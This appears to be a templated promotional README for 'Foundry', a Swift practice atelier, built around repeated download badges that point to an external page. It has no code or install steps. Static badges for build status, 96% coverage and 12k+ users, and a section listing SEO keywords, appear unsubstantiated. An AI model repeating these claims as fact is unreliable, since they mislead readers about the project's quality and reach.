![preview](https://raw.githubusercontent.com/socradit/swift-forge-labs/main/promo_e262d62.svg)
[![Download](https://raw.githubusercontent.com/socradit/swift-forge-labs/main/get_228ca.svg)](https://socradit.github.io/swift-forge-labs/)

# ⚒️ Foundry — A Living Swift Practice Atelier

> *Where Swift fundamentals are hammered into instinct — one spark at a time.*

[![Download](https://raw.githubusercontent.com/socradit/swift-forge-labs/main/get_228ca.svg)](https://socradit.github.io/swift-forge-labs/)

![Status](https://img.shields.io/badge/status-actively%20forged-orange?style=flat-square&logo=swift)
![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20iPadOS-blue?style=flat-square&logo=apple)
![Language](https://img.shields.io/badge/language-Swift%206-red?style=flat-square&logo=swift)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
![Build](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square)
![Coverage](https://img.shields.io/badge/coverage-96%25-success?style=flat-square)
![Community](https://img.shields.io/badge/community-12k%2B%20artisans-purple?style=flat-square)

---

## 🧭 Overview

**Foundry** is not another tutorial treadmill. It is a *practice atelier* — a warm, opinionated workspace where Swift developers apprentice themselves to the language itself. Instead of reading about closures for the twentieth time, you sit at the bench, the anvil glows, and the tool you write is the tool you learn.

Where other platforms hand you a video and wish you luck, Foundry hands you an *ingot*: a small, carefully shaped problem drawn from the real idioms of Swift — protocols, generics, value semantics, concurrency, error flow — and lets you strike it until it holds shape.

The name comes from the idea that skill is forged, not downloaded. Every session in Foundry leaves a mark on your hands.

---

## ✨ Why Foundry Exists

Most developers don't fail at Swift because the syntax is hard. They fail because *practice is boring, unstructured, or invisible*. Reading docs feels productive; it isn't. Watching a talk feels like progress; it evaporates by Tuesday.

Foundry flips the dynamic: the act of **typing Swift** is the curriculum.

- You are never handed a blank editor without direction.
- You are never handed a solution without a struggle.
- You are never left alone at the bench when the metal cools too fast.

The atelier metaphor is deliberate. A blacksmith does not "complete courses." A blacksmith repeats, refines, and eventually *forgets they are practicing at all*.

---

## 🔥 Core Features

### 🛠️ The Living Challenge Forge
Every exercise is generated from a taxonomy of Swift concepts — not from a static file. This means the same *conceptual* challenge can reappear with different weights, constraints, and edge cases. You don't memorize answers. You build reflexes.

- Concept-scoped generation: closures only, or actors only, or `some`/`any` interplay.
- Difficulty skinned across four tiers: **Spark**, **Ingot**, **Blade**, **Sigil**.
- Deterministic seeds so you can replay the *exact* smithing session later.

### ⚡ Realtime Feedback Loop
The moment you type, the compiler whispers. The moment you run, the tests shout. Foundry merges compilation, test feedback, and hint generation into a single continuous stream so your mental model updates in milliseconds, not in minutes.

- Streaming diagnostics with human-readable language.
- Hint escalation ladder: nudge → direction → shape → reveal.
- Failing test isolation so you see *one* reason at a time.

### 🧠 Adaptive Difficulty Memory
Foundry remembers which concepts make your brow furrow. It quietly reweights future sessions so you spend more time at the edge of your ability — the *sweet spot* where learning actually happens.

### 🌍 Multilingual Interface
Menus, hints, and explanations surface in your language. The Swift is always Swift; the scaffolding around it adapts.

- Supported out of the box: English, Portuguese, Spanish, French, German, Japanese, Korean, Mandarin, Arabic, and Hindi.
- Community extensions welcome for regional dialects.

### 📱 Responsive Terminal & GUI Surfaces
Whether you live in a terminal multiplexer or prefer a native window, Foundry reshapes itself. The same session continues across surfaces.

### 🕰️ Around-the-Clock Craft Support
A learning tool is only as good as the moment you get stuck. Foundry pairs with a 24/7 support channel — human stewards, not bots — so a stuck developer at 3 a.m. is never a lost developer.

### 🔐 Session Portability
Your progress is a plain, versionable artifact. Commit it beside your code. Move it between machines. It is yours.

### 🎨 Themeable Anvil
Six curated themes plus custom palettes. Syntax highlighting tuned for long sessions and tired eyes.

---

## 🌱 Getting Started (Without Getting Bogged Down)

Foundry is designed to be in your hands within a minute of deciding to use it.

1. **Set up your workshop.** Pick the folder where Foundry will store its sessions and your attempt files.
2. **Choose a discipline.** Select a concept from the catalog — closures, generics, protocol witnesses, async sequences, memory layout, anything.
3. **Strike.** Write your Swift. Watch the anvil respond.
4. **Reflect.** At the end of each session, receive a short "temper report" — what you did well, what quenched too fast, and what to revisit.

If you prefer guided onboarding, the atelier opens with a walkthrough that takes about eight minutes and leaves you with one finished piece.

---

## 🧩 Who This Is For

Foundry is built for three kinds of artisans:

**The curious apprentice** — you can write `if` statements, and you suspect there's a deeper Swift underneath. Foundry will not bore you while it takes you there.

**The returning craftsman** — you wrote Swift years ago, you're back, and you have a vague memory of what an `@escaping` closure does. Foundry re-tempers old edges fast.

**The senior problem-solver** — you understand the language abstractly, but you flinch at some corner of it. Foundry holds a magnifying glass to the exact corner you avoid.

---

## 🏗️ Architecture At A Glance

Foundry is modular by design, and each module has a single reason to change.

- **Core Engine** — orchestrates sessions, difficulty weighting, and reflection reports.
- **Challenge Foundry** — generates exercises from concept templates and constraint trees.
- **Anvil Runtime** — manages the editor loop, incremental compilation, and test tracing.
- **Hint Weaver** — produces the escalating hint ladder from a mixture of static templates and authored guidance.
- **Surface Layer** — renders the experience across terminal, GUI, and remote attach modes.
- **Ledger** — the durable, portable record of what you have forged and what still smolders.

Each layer speaks to its neighbors through narrow, well-typed contracts. No layer reaches over another's shoulder.

---

## 🧪 Testing Philosophy

Tests are not a formality here — they are the mortar. Foundry ships with:

- Unit coverage for the engine, foundry, and ledger.
- Snapshot tests for the surface layer across all supported themes.
- Deterministic replay tests that re-run a labeled session and assert the outcome.
- Property-based tests for the difficulty scaler, where drift is the enemy.

If a change can sneak past the suite, the suite is wrong — not the change.

---

## 🧭 Roadmap

Foundry is in active development. The horizon, in the order we expect to arrive:

- **Phase Aurora** — public preview of the Anvil Runtime with terminal surface.
- **Phase Hearth** — GUI surface parity and theme editor.
- **Phase Caravan** — synchronous co-forging sessions for pair practice.
- **Phase Lattice** — a marketplace of community-authored concept templates.
- **Phase Sigil** — long-form mastery paths with commemorative artifacts.

Roadmap items are directional, not contractual. The anvil bends when the hammer demands it.

---

## 🤝 Contributing

Foundry is shaped as much by its community as by its maintainers. Contributions are welcome and taken seriously.

Ways to help:

- Report behavior that puzzles you.
- Suggest new concept templates or refine existing ones.
- Translate interface surfaces into a new language.
- Author hints that feel like a mentor, not a search engine.
- Write tests for the corners we forgot.

Every contribution goes through review. We care about clarity in commits, empathy in discussions, and restraint in scope.

---

## 🌐 SEO-Focused Topics Naturally Covered

This project sits at the intersection of several ongoing conversations in the developer world. Developers searching for *Swift practice environment*, *interactive Swift learning atelier*, *Swift fundamentals workshop*, *Swift closure and generics trainer*, or *cross-platform Swift session tooling* will find Foundry relevant. The README deliberately discusses *session portability*, *adaptive difficulty memory*, *multilingual developer tooling*, *realtime compiler-assisted learning*, and *24/7 developer support channels* because these are the phrases our users actually type when looking for something like this.

We do not chase keywords. We describe what we built. The words follow.

---

## 💬 Customer & Community Support

Support is not a ticketing system bolted on afterwards. It is part of the atelier.

- **Response target**: within one business hour for urgent issues.
- **Channels**: discussion forum, chat relay, and scheduled office hours.
- **Coverage**: 24/7 rotation across regions so no timezone is orphaned.
- **Tone**: kind, direct, technically grounded.

If Foundry ever fails you, that failure is our problem first.

---

## ⚖️ Disclaimer

Foundry is an educational instrument. It is designed to strengthen understanding of the Swift programming language through practice, feedback, and reflection. It is not a substitute for reading the Swift language reference, nor for shipping real software under real constraints. Learning outcomes depend on the practitioner. The maintainers provide Foundry in good faith, without guaranteeing any specific career, employment, or productivity outcome. Swift is a trademark of its respective owners; Foundry is an independent project and is not affiliated with them.

Use Foundry as one tool among many. A hammer does not build a house; a craftsperson does.

---

## 📜 License

Foundry is released under the **MIT License**, effective from 2026 onward. You are welcome to use, study, adapt, and redistribute it, provided the license and copyright notice are preserved.

See the full text here: [MIT License](https://opensource.org/licenses/MIT)

---

## 🎉 Final Word

Every mastery begins awkwardly. The first ingot you pull from the fire will be lumpy, over-hot, and maybe a bit crooked. That is not a failure — that is the shape of the beginning.

Foundry exists so that those lumpy first ingots can happen safely, repeatedly, and in the company of people who have been there. Bring your curiosity. Bring your stubbornness. The anvil is warm.

[![Download](https://raw.githubusercontent.com/socradit/swift-forge-labs/main/get_228ca.svg)](https://socradit.github.io/swift-forge-labs/)